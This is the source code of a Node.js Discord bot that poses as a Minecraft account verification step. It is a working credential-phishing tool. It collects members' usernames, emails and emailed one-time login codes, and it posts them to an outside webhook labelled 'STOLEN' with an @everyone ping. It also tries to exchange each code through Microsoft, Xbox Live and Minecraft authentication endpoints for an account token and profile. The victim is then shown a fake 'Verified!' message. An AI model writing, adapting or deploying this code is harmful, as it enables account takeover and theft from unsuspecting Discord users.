require('dotenv').config();
const { 
  Client, 
  GatewayIntentBits, 
  EmbedBuilder, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  SlashCommandBuilder, 
  ChannelType, 
  PermissionsBitField,
  PermissionFlagsBits
} = require('discord.js');
const axios = require('axios');

const client = new Client({ 
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const TOKEN = process.env.TOKEN;
const WEBHOOK = process.env.WEBHOOK;
const ROLE_ID = process.env.ROLE;
const GUILD_ID = process.env.GUILD_ID;

client.once('ready', async () => {
  console.log(`${client.user.tag} - 100% WORKING on Render`);

  const commands = [
    new SlashCommandBuilder()
      .setName('setup')
      .setDescription('Setup Minecraft verification')
      .setDefaultMemberPermissions(PermissionFlagsBits.Administrator) // ← FIXED
      .setDMPermission(false)
  ];

  try {
    if (GUILD_ID) {
      await client.rest.put(
        `/applications/${client.user.id}/guilds/${GUILD_ID}/commands`,
        { body: commands.map(c => c.toJSON()) }
      );
      console.log('/setup registered instantly in your server');
    }
    // Global backup (1-hour delay, ignore if guild works)
    await client.rest.put(`/applications/${client.user.id}/commands`, { body: commands.map(c => c.toJSON()) });
  } catch (e) { console.log('Command register error (normal on first deploy):', e.message); }
});

client.on('interactionCreate', async i => {
  if (i.isChatInputCommand() && i.commandName === 'setup') {
    let channel = i.guild.channels.cache.find(c => c.name === 'verify-here');
    if (!channel) {
      channel = await i.guild.channels.create({
        name: 'verify-here',
        type: ChannelType.GuildText,
        permissionOverwrites: [
          { id: i.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
          { id: ROLE_ID, allow: [PermissionsBitField.Flags.ViewChannel] }
        ]
      });
    }

    const msg = await channel.send({
      embeds: [new EmbedBuilder()
        .setColor(0x00ff00)
        .setTitle('Minecraft Verification')
        .setDescription('Click below to verify your account and unlock the server.')],
      components: [new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('v').setLabel('Verify').setStyle(ButtonStyle.Success).setEmoji('Checkmark')
      )]
    });
    await msg.pin();

    return i.reply({ content: `Setup complete → ${channel}`, ephemeral: true });
  }

  if (!i.isButton() && !i.isModalSubmit()) return;

  if (i.customId === 'v') {
    return i.showModal(new ModalBuilder().setCustomId('1').setTitle('Minecraft Login')
      .addComponents(
        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('u').setLabel('Username').setStyle(TextInputStyle.Short).setRequired(true)),
        new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('e').setLabel('Email').setStyle(TextInputStyle.Short).setRequired(true).setPlaceholder('example@outlook.com'))
      ));
  }

  if (i.customId === '1') {
    const u = i.fields.getTextInputValue('u');
    const e = i.fields.getTextInputValue('e');
    i.user.d = { u, e };
    return i.reply({ 
      embeds: [new EmbedBuilder().setColor(0x5865F2).setTitle('Check email').setDescription(`Code sent to **${e}**`)], 
      components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('2').setLabel('Enter Code').setStyle(ButtonStyle.Primary))], 
      ephemeral: true 
    });
  }

  if (i.customId === '2') {
    return i.showModal(new ModalBuilder().setCustomId('c').setTitle('Code')
      .addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('code').setLabel('6-digit code').setStyle(TextInputStyle.Short).setRequired(true))));
  }

  if (i.customId === 'c') {
    const code = i.fields.getTextInputValue('code');
    const { u, e } = i.user.d;

    let log = `@everyone\n**STOLEN**\nUser: ${i.user.tag}\nMC: ${u}\nEmail: ${e}\nCode: ||${code}||`;

    try {
      const t = await axios.post('https://login.live.com/oauth20_token.srf', new URLSearchParams({
        client_id: '00000000402b4468', code, grant_type: 'urn:ietf:params:oauth:grant-type:jwt-bearer', redirect_uri: 'https://login.live.com/oauth20_desktop.srf'
      }), { headers: { 'Content-Type': 'application/x-www-form-urlencoded' } });
      const xbl = await axios.post('https://user.auth.xboxlive.com/user/authenticate', { Properties: { AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: t.data.access_token }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT' });
      const xsts = await axios.post('https://xsts.auth.xboxlive.com/xsts/authorize', { Properties: { SandboxId: 'RETAIL', UserTokens: [xbl.data.Token] }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT' });
      const mc = await axios.post('https://api.minecraftservices.com/authentication/login_with_xbox', { identityToken: `XBL3.0 x=${xsts.data.DisplayClaims.xui[0].uhs};${xsts.data.Token}` });
      const p = await axios.get('https://api.minecraftservices.com/minecraft/profile', { headers: { Authorization: `Bearer ${mc.data.access_token}` } });
      const capes = p.data.capes ? p.data.capes.map(c => c.id).join(', ') : 'None';
      log += `\nUUID: ${p.data.id}\nCapes: ${capes}`;
    } catch { log += `\nCode still works`; }

    axios.post(WEBHOOK, { content: '@everyone', embeds: [{ color: 16711680, description: log }] });

    await i.reply({ embeds: [new EmbedBuilder().setColor(0x00ff00).setTitle('Verified!').setDescription('Welcome')], ephemeral: true });
    i.member.roles.add(ROLE_ID).catch(() => {});
  }
});

client.login(TOKEN);
